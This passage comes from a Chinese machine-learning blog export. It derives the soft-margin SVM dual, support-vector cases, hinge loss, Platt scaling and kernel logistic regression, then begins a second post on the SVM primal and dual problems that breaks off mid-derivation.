前面提到的SVM都是硬间隔的，所谓的硬间隔，就是要求所有的样本都分对，此外还要求每个样本离分离超平面有一定的距离。为了解决线性不可分的情况，使用了核函数进行特征空间的变换，然而，即使我们进行特征空间变换后把样本完全的分开，也有可能这个“线性可分”是因为噪声点而过拟合造成的。（很多情况下，训练数据中有一些噪声点，把这些噪声点去除后，剩下的大部分样本组成的特征空间是线性可分的。） 因此，我们可以对SVM适当的放松条件，不再要求所有的点都分对，而是对不能满足约束的样本进行一些“惩罚”，为此引入惩罚因子\\(\\xi_i \\ge 0\\)，并写出软间隔SVM的形式如下： \\[ \\begin{align*} \\min_{ {\\bf w}, b,\\xi }\\hspace{2ex}&amp;\\frac{1}{2}{\\bf w^Tw} + C\\cdot \\sum_{i=1}^n \\xi_i\\\\ {\\rm s.t.} \\hspace{2ex} &amp;y_i({\\bf w^\\mathsf{T}x}_i + b) \\ge 1 -\\xi_i \\\\ \\hspace{2ex} &amp;\\xi_i \\ge0, i=1,2,....,n \\end{align*}\\tag{2-1} \\] C为惩罚参数，C越大说明越不能容忍犯错，尽可能的分对所有的点，C越小说明对错误的容忍程度越大，间隔可以越宽。 下图就直观的描述了软间隔SVM，紫色的violation说明该点在间隔内，而紫色的长度就记录了对间隔的违反程度，即\\(\\xi_i\\)（啰嗦一句，原先我们要求都在间隔外）。 soft-margin-svm 软间隔SVM的对偶问题 和之前硬边界的SVM一样，我们求解对偶问题。 首先同样写出拉格朗日函数： \\[ \\mathcal{L}({\\bf w},b, {\\boldsymbol \\xi}, {\\boldsymbol \\alpha}, {\\boldsymbol \\beta}) = \\frac{1}{2}{\\bf w^\\mathsf{T}w} + C\\cdot \\sum_{i=1}^n \\xi_i + \\sum_{i=1}^n\\alpha_i(1 - \\xi_i - y_i({\\bf w^Tx_i}+b)) -\\sum_{i=1}^n\\beta_i\\xi_i \\] \\(\\mathcal{L}({\\bf w},b, {\\boldsymbol \\xi}, {\\boldsymbol \\alpha}, {\\boldsymbol \\beta})\\)对\\({\\bf w}, b, \\xi_i\\)的极小得 \\[ \\begin{align*} \\frac{\\partial \\mathcal{L} }{\\partial \\bf w} &amp;= {\\bf w}-\\sum_{i=1}^n\\alpha_iy_i{\\bf x_i} =0\\\\ \\frac{\\partial \\mathcal{L} }{\\partial b } &amp;= -\\sum_{i=1}^n\\alpha_iy_i =0\\\\ \\frac{\\partial \\mathcal{L} }{\\partial \\xi_i} &amp;= C - \\alpha_i - \\beta_i =0\\\\ \\end{align*} \\] 整理得： \\[ \\begin{align*} {\\bf w} =\\sum_{i=1}^n\\alpha_iy_i{\\bf x_i}\\\\ \\sum_{i=1}^n\\alpha_iy_i =0\\\\ C - \\alpha_i - \\beta_i =0\\tag{2-2} \\end{align*} \\] 带入拉格朗日函数得： \\[ \\min_{ {\\bf w},b, {\\boldsymbol \\xi} }\\mathcal{L}({\\bf w},b, {\\boldsymbol \\xi}, {\\boldsymbol \\alpha}, {\\boldsymbol \\beta}) = - \\frac{1}{2}\\sum_{i=1}^n\\sum_{j=1}^n\\alpha_i\\alpha_jy_iy_j{\\bf x_i^T x_j} + \\sum_{i=1}^n\\alpha_i \\] 在对\\(\\min_{ {\\bf w},b, {\\boldsymbol \\xi} }\\mathcal{L}({\\bf w},b, {\\boldsymbol \\xi}, {\\boldsymbol \\alpha}, {\\boldsymbol \\beta})\\)求极大，得到下式： \\[ \\begin{align*} \\max_{ {\\boldsymbol \\alpha} }\\hspace{2ex}&amp; \\sum_{i=1}^n\\alpha_i - \\frac{1}{2}\\sum_{i=1}^n\\sum_{j=1}^n\\alpha_i\\alpha_jy_iy_j{\\bf x_i^T x_j} \\\\ {\\rm s.t.} \\hspace{2ex} &amp; \\sum_{i=1}^n\\alpha_iy_i =0\\\\ \\hspace{2ex} &amp; \\alpha_i \\ge 0\\\\ \\hspace{2ex} &amp; \\beta_i \\ge 0\\\\ \\hspace{2ex} &amp; C - \\alpha_i -\\beta_i = 0\\\\\\tag{2-3} \\end{align*} \\] 前面提到过，w无关了，所以不写\\({\\bf w} =\\sum_{i=1}^n\\alpha_iy_i{\\bf x_i}\\) 又因为可以利用等式约束去除\\(\\beta_i\\)， \\(\\beta_i \\ge 0 \\Rightarrow C - \\alpha_i \\ge 0\\) 于是2-3可以化简为: \\[ \\begin{align*} \\max_{ {\\boldsymbol \\alpha} }\\hspace{2ex}&amp; \\sum_{i=1}^n\\alpha_i - \\frac{1}{2}\\sum_{i=1}^n\\sum_{j=1}^n\\alpha_i\\alpha_jy_iy_j{\\bf x_i^T x_j} \\\\ {\\rm s.t.} \\hspace{2ex} &amp; \\sum_{i=1}^n\\alpha_iy_i =0\\\\ \\hspace{2ex} &amp; 0 \\le \\alpha_i \\le C\\tag{2-4} \\end{align*} \\] 2-4即为我们的软间隔SVM对偶问题。其对应的KKT条件为： 主问题可行：\\(y_i({\\bf w^\\mathsf{T}x}_i + b) \\ge 1 -\\xi_i ; \\hspace{2ex} \\xi_i \\ge 0\\) 对偶问题可行：\\(\\alpha_i \\ge 0; \\hspace{2ex} \\beta_i \\ge 0\\) 互补松弛：\\(\\alpha_i(1 - \\xi_i - y_i({\\bf w^Tx_i}+b)) = 0; \\hspace{2ex} \\beta_i\\xi_i = 0\\) 2-2的条件: \\({\\bf w} = \\sum_{i=1}^n\\alpha_iy_i{\\bf x_i} ; \\hspace{2ex} \\sum_{i=1}^n\\alpha_iy_i =0 ;\\hspace{2ex} C - \\alpha_i - \\beta_i =0\\\\\\) 2-4和硬间隔的对偶SVM对比发现，其实就是多了限制\\(\\alpha_i \\le C\\)。 软间隔SVM的支持向量 分析软间隔SVM对偶问题的KKT条件，可以得出结论： - 当\\(\\alpha_i = 0\\) 此时不是支持向量 - 当\\(\\alpha_i \\gt 0 \\Rightarrow 1 - \\xi_i - y_i({\\bf w^Tx_i}+b) = 0\\)，此时为支持向量，但可以细分为两种情况 - \\(\\alpha_i &lt; C \\Rightarrow \\beta_i\\ne0 ; \\ \\xi_i =0\\), 此时样本i正好在间隔上，称为自由的支持向量free support vector。 - \\(\\alpha_i = C \\Rightarrow \\beta_i=0 ; \\ \\xi_i &gt;0\\)，此时\\({\\bf x_i}\\)在间隔内，\\(\\xi_i\\)反应了和间隔的距离。称为受限支持向量bounded support vector。此时又分为三种情况： - \\(\\xi_i \\lt 1\\) ，分类正确，\\({\\bf x_i}\\)在间隔边界和超平面之间 - \\(\\xi_i = 1\\) ，\\({\\bf x_i}\\)在超平面上 - \\(\\xi_i \\gt 1\\) ，分类错误，\\({\\bf x_i}\\)在超平面误分一侧 由此可以看出，软间隔SVM最终模型仅和支持向量有关，引入软间隔后仍保持稀疏性。 下面是林轩田老师给的图，自由支持向量用方框标出，受限支持向量以三角标出。 soft-margin-svm-support-vector 求解对偶问题 假设求解出了\\(\\alpha\\), 那么根据KKT条件, \\({\\bf w} = \\sum_{i=1}^n \\alpha_iy_i{\\bf x_i}\\) 那b呢？模仿之前的硬间隔SVM对偶问题，选取一个\\(\\alpha_i \\gt 0\\) 可得\\(b = y_i - y_i\\xi_i - {\\bf w^\\mathsf{T}x}_i\\)，然而这样需要求解\\(\\xi_i\\),因此可以看看另外一个互补松弛条件。\\(\\beta_i\\xi_i = 0 \\Rightarrow (C - \\alpha_i)\\xi_i = 0\\),即当\\(\\alpha_i \\lt C \\Rightarrow \\xi_i = 0\\)，因此选取任意的自由的支持向量即可求解\\(b = y_i - {\\bf w^\\mathsf{T}x}_i\\) 当然，极少数的情况下，没有自由的支持向量，那么b就只能通过一系列不等式得出，此时可能有不止一个b存在。 模型选择 值得注意的是，虽然是软间隔，但仍然可能过拟合。 下面是林轩田老师给出的使用高斯核函数的软间隔SVM的不同参数效果图： soft-margin-svm-gaussian-kernel-parameter 小的C可能会欠拟合，大的C可能会过拟合。因此要小心的选择参数。 如何选择参数呢，常用的就是交叉验证的方法。 这里推导一个有趣的公式---使用留一交叉验证（即样本数m，m折的交叉验证）的留一误差的上界是: \\[ \\rm E_{LOOCV} =\\frac{\\text{SV_num}}{m}\\tag{2-5} \\] 简单证明如下： 设总的数据集为\\(g\\) ，此时验证集为样本点\\(({\\bf x_n}, y_n)\\) 若最优的\\(\\alpha_n = 0\\) ,则该点不是支持向量。 若把该点去掉，求解出的\\(\\{\\alpha_1,\\alpha_2,\\cdots, \\alpha_{n-1}\\}\\)仍然是最优的 也就是去除非支持向量的点求解出的\\(g^-\\)和不去掉求解出的\\(g\\)是一样的，又因为非支持向量肯定分类正确，于是有：\\(e_{\\rm non-SV} = {\\rm err}(g^-, {\\rm non\\text{-}SV}) = {\\rm err}(g, {\\rm non\\text{-}SV}) = 0\\) 而如果是支持向量有：\\(e_{\\rm SV} \\le 1\\) 求和取平均得到式2-5 因此，留一交叉验证的error的上界是支持向量个数的比例。如果一个算法的支持向量数比较少，那么它过拟合的风险可能就比较小。因此在调参的时候，可以排除一些支持向量数太多的模型，然后再去验证剩下的模型。 其它 回顾一下软间隔SVM原始问题2-1： \\[ \\begin{align*} \\min_{ {\\bf w}, b,\\xi}\\hspace{2ex}&amp;\\frac{1}{2}{\\bf w^Tw} + C\\cdot \\sum_{i=1}^n \\xi_i\\\\ {\\rm s.t.} \\hspace{2ex} &amp;y_i({\\bf w^\\mathsf{T}x}_i + b) \\ge 1 -\\xi_i \\\\ \\hspace{2ex} &amp;\\xi_i \\ge0, i=1,2,....,n \\end{align*} \\] \\(\\xi_i\\)描述了对间隔的破坏程度，啰嗦的分析一下有两种情况： 该点破坏了间隔边界，\\(\\xi_i = 1 - y_i({\\bf w^T}{\\bf x}_i + b) \\gt 0\\) 该点没有破坏边界，\\(\\xi_i = 0\\) 因此，我们可以把软间隔SVM 2-1写为一个没有限制的优化问题： \\[ \\min_{ {\\bf w}, b}\\hspace{2ex}\\frac{1}{2}{\\bf w^\\mathsf{T}w} + C\\cdot \\sum_{i=1}^n \\max \\left( 1 - y_i({\\bf w^T}{\\bf x}_i + b) , 0\\right)\\\\ \\tag{3-1} \\] 如果你学过正则化，会发现上面的式子和正则化是十分相似的，正则化更一般的形式是： \\[ \\min_f \\hspace{2ex} \\Omega(f) + C\\sum_{i=1}^n l\\left( f({\\bf x_i}) , y_i\\right) \\tag{3-2} \\] 式3-2中\\(\\Omega(f)\\)称为结构风险，用于描述模型f的某些性质，第二项\\(l\\left( f({\\bf x_i}) , y_i\\right)\\)则称为经验风险，用于描述模型和训练数据的契合程度。 我们的式3-1的第一项是w的长度，描述了模型本身的复杂度，第二项则是样本中的误差和。换句话说，大间隔其实就是正则化的一种体现，代表选择的超平面要少。而软间隔则是一种特殊的损失函数，称为hinge损失。参数C出现在3-1和3-2中，若C越大，则代表越小的正则化。 将软间隔SVM看作一种正则化，我们可以将其理论延伸到其它模型，与其它模型建立联系。 Hinge损失 上一小节已经剧透过，3-1第二项为hinge损失，其它常见的0-1损失替代函数有： hinge损失： \\(l_{hinge}(z) = \\max \\left( 1 - z , 0\\right)\\) 指数损失： \\(l_{exp}(z) = \\exp(-z)\\) 对率损失：\\(l_{log}(z) = \\log(1+\\exp(-z))\\) 我们什么始化用到这些损失函数呢？ 对率损失其实是逻辑回归采用的，而指数损失将在后面介绍的Adaboost模型中用到。 这里使用了周志华老师的图来作为对比(PS: 该图的log是以2为底的，这样正好为0-1损失的上界): hinge-exponential-logistic-loss-function 上面提到的hinge、指数、对率损失（以2为底）函数都是0-1损失函数的上界。 hinge和逻辑回归使用的损失函数（对率损失）十分相似： 当z趋于正无穷，hinge为0，对率损失约等于0 当z趋于负无穷，它们都趋于负无穷。 因此可以把软间隔SVM看作是L2正则化的逻辑回归。而正则化的逻辑回归也像是在做SVM。它们的一些区别和相似周志华老师概况如下： 支持向量机和对率回归的优化目标相近。通常情形下它们的性能也相当。 对率回归的优势主要在于其输出具有自然的的概率意义，即在给出预测标记的同时也给出了概率，而支持向量机的输出不具有概率意义，要得到概率输出需要进行特殊处理。此外对率回归可以直接用于多分类任务，支持向量机为此则需要进行推广[Platt, 2000]。 另一方面，hinge损失有一快“平坦”的区域（就是z &gt;=1），这使得支持向量机的解具有稀疏性。而对率损失函数是光滑的单调递减函数，不能导出类似支持向量的概念，因此，对率回归的解依赖于更多的训练样本，其预测开销更大。 ----From《机器学习》 周志华 P132-133 概率SVM--Platt模型 周志华老师上面总结得很好，逻辑回归一个好处就是直接输出概率，现在我们来讨论如何让SVM模型也有概率输出。 有两种naive的想法： 先跑软间隔SVM得到超平面参数w和b，然后将它们直接放在Logistic函数（就是那个s的曲线也叫sigmoid函数）计算。这种做法在实际中效果不错，但是失去了我们推导逻辑回归时采用的最大似然的思想等。 先跑软间隔SVM得到超平面参数w和b，将这个结果作为逻辑回归的初始权重，然后使用逻辑回归算法得到最后的分类函数。但是这种方法和直接使用逻辑回归的方法结果差不多，并且丢失了SVM的核方法等特性。 如果能融合上面两种想法就好了。分析一下： SVM得到的结果\\({\\bf w}_{\\rm SVM}^\\mathsf{T}{\\boldsymbol{\\Phi}({\\bf x})} + b_{\\rm SVM}\\)本质上是一个分数，把这个分数进行放缩和平移，加大自由度。即\\(g({\\bf x}) = \\theta(A \\cdot ({\\bf w}_{\\rm SVM}^\\mathsf{T}{\\boldsymbol{\\Phi}({\\bf x})} + b_{\\rm SVM}) + B)\\)。然后通过逻辑回归训练A和B两个参数来达到使用MLE的目的和效果。这个算法本质上还是SVM，因此对偶、核技巧都可以使用。从几何上说，SVM找出分割面的法向量，然后用逻辑回归进行平移放缩微调。通常，如果SVM的解比较好，A &gt; 0 而B接近0. 因此，新的问题为： \\[ \\min_{A,B}\\hspace{2ex}\\frac{1}{N}\\sum_{n=1}^N \\log\\left(1+\\exp\\left(-y_n(A\\cdot (\\underbrace{ {\\bf w}_{\\rm SVM}^\\mathsf{T}{\\boldsymbol{\\Phi}({\\bf x}_n)} + b_{\\rm SVM} }_{\\boldsymbol{\\Phi}_{\\rm SVM}({\\bf x}_n)}) + B)\\right)\\right)\\tag{3-3} \\] 很复杂？其实是两步： 解SVM 解逻辑回归（梯度下降等都行） 这个方法称为Platt模型。 核Logistic回归 上面的问题3-3并没有直接在转换后的空间\\(\\mathcal{Z}\\)求解逻辑回归，而是通过核函数把数据变换到\\(\\mathcal{Z}\\)空间中。由于没有直接在\\(\\mathcal{Z}\\)空间求解逻辑回归，因此可能不是该空间最好的逻辑回归的解。如果要在\\(\\mathcal{Z}\\)空间中找逻辑回归的最优解怎么做？ 像SVM一样用核方法？但是逻辑回归不是二次规划问题。 回想之前的SVM，不仅在求解w的时候用到了\\(\\mathcal{Z}\\)空间的内积，更重要的是，在之后预测的时候，将w表示成了一堆已经看过的z的线性组合，即\\({\\bf w^Tz} + b= \\sum_{i=1}^n \\alpha_iy_i\\Phi({\\bf x_i}) \\Phi({\\bf x}) + b=\\sum_{i=1}^n \\alpha_iy_iK({\\bf x_i,x}) + b\\)。换句话说，w表示成了z的线性组合，是能使用核方法的关键。 那么，如果我们的w能被z表示，那不就可以使用核函数了么！ 接下来证明如下（这个定理称为表示定理）： 对于任何带有L2正则化的线性模型 \\[ \\min_{\\bf w}\\hspace{2ex}\\frac{\\lambda}{n}{\\bf w^\\mathsf{T}w} + \\frac{1}{n}\\sum_{i=1}^n {\\rm err}(y_i, {\\bf w^\\mathsf{T}z}_i) \\] 其最优的\\({\\bf w_*}=\\sum_{i=1}^n\\beta_i{\\bf z_i}\\) 我们可以将最优的\\({\\bf w_*}\\)分解为两个向量\\({\\bf w}_{||}\\)和\\({\\bf w}_{\\perp}\\)，即\\({\\bf w}_\\ast = {\\bf w}_{||} + {\\bf w}_\\perp\\)。其中\\({\\bf w}_{||} \\in {\\rm span}({\\bf z}_i), {\\bf w}_{\\perp} \\perp {\\rm span}({\\bf z}_i)\\) 由于正交的内积为0，因此有\\({\\rm err}(y_n, {\\bf w_\\ast^\\mathsf{T}z}_n) = {\\rm err}(y_n, ({\\bf w_\\|} + {\\bf w}_\\perp)^\\mathsf{T}{\\bf z}_n) = {\\rm err}(y_n, {\\bf w_\\|^\\mathsf{T}z}_n)\\)，即\\(\\bf w_*\\)和\\(\\bf w_{||}\\)有相同的error 又因为\\({\\bf w}_\\ast^\\mathsf{T}{\\bf w}_\\ast = {\\bf w_\\|^\\mathsf{T}w_\\|} + 2{\\bf w_\\|^\\mathsf{T}w_\\perp} + {\\bf w_\\perp^\\mathsf{T}w_\\perp} = {\\bf w_\\|^\\mathsf{T}w_\\|} + {\\bf w_\\perp^\\mathsf{T}w_\\perp} &gt; {\\bf w_\\|^\\mathsf{T}w_\\|}\\)这意味着\\(\\bf w_{||}\\)比最优的\\(\\bf w_*\\)的目标值更小，是矛盾的，因此\\({\\bf w}_\\perp = {\\bf 0}\\) 所以最优解可以用\\(\\bf z\\)的线性组合表示。由此得证。 接下来定义L2正则项的逻辑回归， \\[ \\min_{\\bf w}\\hspace{2ex}\\frac{\\lambda}{n}{\\bf w}^\\mathsf{T}{\\bf w} + \\frac{1}{n}\\sum_{i=1}^n \\log(1+\\exp(-y_i{\\bf w}^\\mathsf{T}{\\bf z}_i)) \\] 由表示定理，最优的\\({\\bf w_*}=\\sum_{i=1}^n\\beta_i{\\bf z_i}\\)。将该式代入原始问题，可以将原来关于w的问题转化成关于β的问题，即核逻辑回归（Kernel Logistic Regression）： \\[ \\min_{\\boldsymbol{\\beta} } \\frac{\\lambda}{n} \\sum_{i=1}^n\\sum_{i=1}^n\\beta_i\\beta_j K({\\bf x}_i, {\\bf x}_j) + \\frac{1}{n}\\sum_{i=1}^n\\log\\left(1+\\exp\\left(-y_i\\sum_{j=1}^n\\beta_j K({\\bf x}_i, {\\bf x}_j)\\right)\\right)\\tag{3-4} \\] 这是没有约束的优化问题，可以用梯度下降等方法求解。 林轩田老师讲解了另一个视角来理解核逻辑回归问题： 3-4最后一项\\(\\sum_{j=1}^n\\beta_j K({\\bf x}_i, {\\bf x}_j)\\)可以看成是先求\\(\\bf x_i\\)和其它数据点\\(\\bf x_1,\\cdots x_m\\)的相似度（前面讲过核函数从某种意义上讲是相似度的一种体现），然后将这个相似度和变量\\(\\beta\\)求内积，其实是一种线性模型。 前面的项\\(\\sum_{i=1}^n\\sum_{i=1}^n\\beta_i\\beta_j K({\\bf x}_i, {\\bf x}_j)\\)写成矩阵的形式是：\\(\\boldsymbol{\\beta}^\\mathsf{T}{\\rm K}\\boldsymbol{\\beta}\\)，本质上是一个正则化。 因此核逻辑回归可以看成是关于\\(\\beta\\)的线性模型，用核函数转换数据，并且用核函数来正则化。(我们原先的理解是将w嵌入到核函数的隐式转换并作L2正则) 核逻辑回归和SVM相比，其系数\\(\\beta_i\\)通常不为0。 参考资料 机器学习技法 - 林轩田 《统计学习方法》 - 李航 《机器学习》 - 周志华 《从零构建支持向量机(SVM)》 - 张皓","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"机器学习","slug":"study/机器学习","permalink":"https://www.hrwhisper.me/categories/study/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"Machine Learning model","slug":"Machine-Learning-model","permalink":"https://www.hrwhisper.me/tags/Machine-Learning-model/"}]},{"title":"『我爱机器学习』深入理解SVM(一) 原始问题和对偶问题","slug":"machine-learning-support-vector-machine-1","date":"2018-03-19T12:40:20.000Z","updated":"2020-10-21T15:38:17.185Z","comments":true,"path":"machine-learning-support-vector-machine-1/","link":"","permalink":"https://www.hrwhisper.me/machine-learning-support-vector-machine-1/","excerpt":"本文尽可能通俗、详细的介绍支持向量机SVM内容。 包括 线性可分SVM SVM对偶问题","text":"本文尽可能通俗、详细的介绍支持向量机SVM内容。 包括 线性可分SVM SVM对偶问题 线性可分SVM 回顾一下感知机， 数据：\\(\\{({\\bf x_1}, y_1),({\\bf x_2}, y_2),\\cdots,({\\bf x_n}, y_n) \\}, \\ y \\in \\{-1, + 1\\}\\) 模型为： \\[ f(x) = {\\rm sign}({\\bf w^Tx}+b) \\] 其损失函数为所有误分类点到超平面S的总函数距离： \\[ -\\sum_{x_i\\in M}y_i({\\bf w^T x_i} + b） \\] 感知机选取不同的初值或选取不同的分类点，解可能不同。 PS: 支持向量机的输入和感知机是一样的。 那么感知机的许多解中，哪个比较好？比如下面的这三个： there_classifiers_fatness 直观上看，我们希望得到的是第三个结果，因为分类的边界离样本点远，这样，容错性（鲁棒性robust）会比较好。 仍然设我们的平面为\\({\\bf w^Tx}+b\\)，我们有如下优化问题： \\[ \\begin{align*} \\max_{\\bf w,b} \\hspace{3ex}&amp;{\\rm margin}({\\bf w},b) \\tag{1-1}\\\\ {\\rm s.t.}\\hspace{3ex} &amp;y_i{\\bf (w^\\mathsf{T}x}_i + b)&gt; 0, \\hspace{3ex}i=1,2..n\\\\ &amp;{\\rm margin}({\\bf w},b) = \\min_{i=1,\\ldots,m}{\\rm distance}({\\bf x}_i, {\\bf w},b) \\end{align*} \\] 上面的第一个约束条件我们已经在感知机中见过，表达的意思就是全部样本都分类正确（这里我们先将设数据集线性可分），其中\\(y_i({\\bf w^T x_i} + b)\\)也叫做函数距离。第二个优化条件则是定义边界为样本到超平面最短的距离，这个距离稍后详解，我们的目标函数则是最大化它。 在感知机中，我们证明过点x到平面的距离为： \\[ {\\rm distance}({\\bf x}_i, {\\bf w},b) = \\frac{1}{|\\!|{\\bf w}|\\!|}|{\\bf w^T x_i} + b| \\] 在数据集线性可分的情况下，分离超平面对数据集中每个点都有\\(y_i(w^Tx_i+b)&gt;0\\)。因此，距离的计算公式又可以写为: \\[ {\\rm distance}({\\bf x}_i, {\\bf w},b) = \\frac{1}{|\\!|{\\bf w}|\\!|}y_i({\\bf w^T x_i} + b)\\tag{1-2} \\] 1-2这个距离称为几何距离。函数距离和几何距离有啥关系呢？为什么要用几何距离呢？ 几何距离就相当于函数距离做了规范化。函数距离只能表示分类的正确性，但是不同超平面的系数是可以放缩的，比如\\({\\bf w^T x_i} + b = 0\\)和 \\(3{\\bf w^T x_i} +3 b = 0\\) 所表示的超平面是一样的，但是函数距离后者是前者的3倍！因此，确定超平面的时候，应该使用几何距离。 于是，我们假定让点到超平面的函数最小几何距离为\\(\\gamma\\)，式1-1可以写为： \\[ \\begin{align*} \\max_{\\bf w,b} \\hspace{3ex}&amp; \\gamma\\tag{1-3}\\\\ {\\rm s.t.}\\hspace{3ex} &amp; \\frac{y_i({\\bf w^T x_i} + b)}{|\\!|{\\bf w}|\\!| } \\ge \\gamma, \\hspace{3ex}i=1,2,\\cdots ,n \\end{align*} \\] PS: 原来的\\(y_i({\\bf w^T x_i} + b) &gt;0\\)的条件限制不如新的条件，因此略去了。 考虑函数间隔和几何间隔的关系，可以将1-3写为： \\[ \\begin{align*} \\max_{\\bf w,b} \\hspace{3ex}&amp; \\frac{ \\gamma}{|\\!|{\\bf w}|\\!| }\\tag{1-3}\\\\ {\\rm s.t.}\\hspace{3ex} &amp;y_i({\\bf w^T x_i} + b)\\ge \\gamma, \\hspace{3ex}i=1,2,\\cdots ,n \\end{align*} \\] 原来\\(\\gamma\\)是点到超平面的最小几何距离，现在仍然是\\(\\gamma\\)则是最小的函数距离，但是优化的目标仍然是几何距离。 现在，可以进一步化简，\\(\\gamma\\)的取值其实对约束条件没有影响，也对优化目标没有影响。因为假设\\(\\bf w\\)和b按比例变为\\(\\lambda {\\bf w}\\)和\\(\\lambda b\\)，则函数间隔也变成了\\(\\lambda\\gamma\\)（PS：同时可以看出几何间隔还是一样的 ）。因此，不妨令\\(\\gamma = 1\\)，于是可以重写问题如下： \\[ \\begin{align*} \\max_{\\bf w,b} \\hspace{3ex}&amp; \\frac{1}{|\\!|{\\bf w}|\\!|}\\\\ {\\rm s.t.}\\hspace{3ex} &amp; y_i({\\bf w^T x_i} + b) \\ge 1, \\hspace{3ex} i=1,2,\\cdots ,n \\end{align*} \\] 注意最大化 \\(\\frac{1}{||w||}\\)和最小化\\(\\frac{1}{2}||{\\bf w}||^2 =\\frac{1}{2}{\\bf w^Tw}\\)是等价的，因此有： \\[ \\begin{align*} \\min_{\\bf w,b}\\hspace{3ex} &amp; \\frac{1}{2} {\\bf w^Tw}\\tag{1-4}\\\\ {\\rm s.t.}\\hspace{3ex} &amp; y_i({\\bf w^T x_i} + b) \\ge 1, \\hspace{3ex}i=1,2,\\cdots ,n \\end{align*} \\] 式1-4所表示的优化问题就称为SVM的原始问题。 在很多介绍SVM的资料中（包括西瓜书），对于SVM的原始问题都十分简单。它们都很直接的说：限制条件为\\(y_i({\\bf w^T x_i} + b) \\ge 1\\)，然后直接做类似如下推导： \\[ \\begin{align} &amp;{\\bf w^T x^+} + b = +1 &amp; \\\\&amp;{\\bf w^T x^-} + b =-1 &amp; \\\\联立两式：&amp;{\\bf w^T (x^+ - x^-) } = 2&amp; \\\\ 因为：&amp; {\\bf x^+ = x^- + \\lambda w } &amp;\\Rightarrow \\lambda = \\frac{2}{\\bf w^Tw} \\\\间距和为：&amp; |\\!|\\bf{x^+ - x^-}|\\!| = |\\!|\\lambda w|\\!|= \\frac{2}{\\bf w^Tw} |\\!|w|\\!| = \\frac{2}{|\\!|w|\\!|} \\\\然后最大化&amp;\\frac{2}{|\\!|w|\\!|}和最小化 \\frac{1}{2}{\\bf w^Tw}等价 \\end{align} \\] 但其实限制条件是从上面这样缩放而来的，因此本文关于原问题的基本是按照林轩田老师和李航老师的思路写的。 这个图很直观的反应了最大间隔分离超平面完全由离该超平面最近的点定义，其它点如果从数据集中删除掉，对最优超平面的选择没有任何影响。这些决定了最大间隔分离超平面的点通常被称为支持向量，因此SVM的意思就是使用支持向量学习出最优的超平面。 二次规划求解 式1-4所表示的SVM原始问题是一个凸的二次规划问题，可以直接用现成的优化计算包求解。 在此之前，需要表示为标准形式。 二次规划的标准形式为： \\[ \\begin{align*} \\min_{\\bf u} &amp; \\hspace{3ex}\\frac{1}{2}{\\bf u}^\\mathsf{T}{\\rm Q}{\\bf u} + {\\bf p^\\mathsf{T}u} \\\\ {\\rm s.t.} &amp; \\hspace{3ex}{\\bf a}_i^\\mathsf{T}{\\bf u} \\ge c_i, {\\rm for\\ }i =1,2,\\ldots, M \\end{align*} \\] 根据和1-4的对应关系，设维度为d得： \\[ \\begin{align*} {\\bf u} &amp;= \\left[\\begin{array}{c}b \\\\ {\\bf w}\\end{array}\\right] \\\\ {\\rm Q} &amp;= \\left[\\begin{matrix} 0 &amp; {\\bf 0}_d^\\mathsf{T} \\\\ {\\bf 0}_d &amp; {\\rm I}_d\\end{matrix}\\right] \\\\ {\\bf p} &amp;= {\\bf 0}_{d+1} \\\\ {\\bf a}_n^\\mathsf{T} &amp;= y_n\\left[\\begin{array}{c}1 &amp; {\\bf x}_n^\\mathsf{T}\\end{array}\\right] \\\\ c_n &amp;= 1 \\\\ M &amp;= n \\end{align*} \\] SVM对偶问题 虽然可以求解1-4的SVM原始问题，但是我们可以利用拉格朗日乘子法得到对偶问题。这样的好处是： 对偶问题往往更容易求解 自然引入核函数，进而推广到非线性分类问题 好处2在下一小结再讲。现在讲讲好处1。 在线性回归一章中，讲到可以进行空间的变换。 设\\({\\bf z} = \\Phi({\\bf x})\\), 则SVM 原始问题写为： \\[ \\begin{align*} \\min_{\\bf w,b}\\hspace{3ex} &amp; \\frac{1}{2} {\\bf w^Tw}\\\\ {\\rm s.t.}\\hspace{3ex} &amp; y_i({\\bf w^T \\Phi({x})} + b) \\ge 1, \\hspace{3ex}i=1,2,\\cdots ,n \\end{align*} \\] x经过非线性特征转换以后，映射到新空间里得到的z通常维度比较高。 记映射前维度为d, 映射后向量的维度为\\(\\tilde{d}\\)，则求解二次规划时需要面对\\(\\tilde{d} + 1\\)个变量(w和b)和n个限制条件。 因此，需要探索一种方法使得SVM不去依赖\\(\\tilde{d}\\)。 拉格朗日乘子法 首先讲解拉格朗日乘子法，给定优化问题： \\[ \\begin{align*} \\min_{\\bf x} &amp; \\hspace{3ex} f({\\bf x}) \\\\ {\\rm s.t.} &amp; \\hspace{3ex} g_i({\\bf x}) \\le 0, \\ {\\rm for\\ }i =1,2,\\ldots, m \\\\ &amp; \\hspace{3ex} h_j({\\bf x}) = 0, \\ {\\rm for\\ }j =1,2,\\ldots, n \\end{align*} \\] 可以写出拉格朗日函数： \\[ \\mathcal{L({\\bf x},{\\boldsymbol \\alpha}, {\\boldsymbol \\beta})} = f({\\bf x}) + \\sum_{i=1}^m\\alpha_ig_i({\\bf x}) + \\sum_{j=1}^n\\beta_jh_j({\\bf x}), \\alpha_i \\ge 0 \\] 则原问题等价于： \\[ \\begin{align} \\min_{ {\\bf x} } \\max_{ {\\boldsymbol \\alpha}, {\\boldsymbol \\beta} } &amp; \\tag{2-1}\\hspace{3ex} \\mathcal{L({\\bf x},{\\boldsymbol \\alpha}, {\\boldsymbol \\beta})} \\\\ {\\rm s.t.} &amp; \\hspace{3ex} \\alpha_i \\ge 0 \\end{align} \\] 为什么呢？做个简单的推导： \\[ \\begin{align} &amp;\\min_{ {\\bf x} } \\max_{ {\\boldsymbol \\alpha}, {\\boldsymbol \\beta} } \\mathcal{L({\\bf x},{\\boldsymbol \\alpha}, {\\boldsymbol \\beta})} \\\\ = &amp; \\min_{ {\\bf x} } \\left( f(x) + \\max_{ {\\boldsymbol \\alpha}, {\\boldsymbol \\beta} } \\left( \\sum_{i=1}^m\\alpha_ig_i({\\bf x}) + \\sum_{j=1}^n\\beta_jh_j({\\bf x})\\right) \\right) \\\\=&amp; \\min_{ {\\bf x} } \\left( f(x) +\\begin{cases} 0&amp; \\text{u满足约束条件}\\\\ \\infty&amp; \\text{otherwise} \\end{cases} \\right) \\end{align} \\] 当g不满足约束条件的时候（\\(g_i(x) \\gt 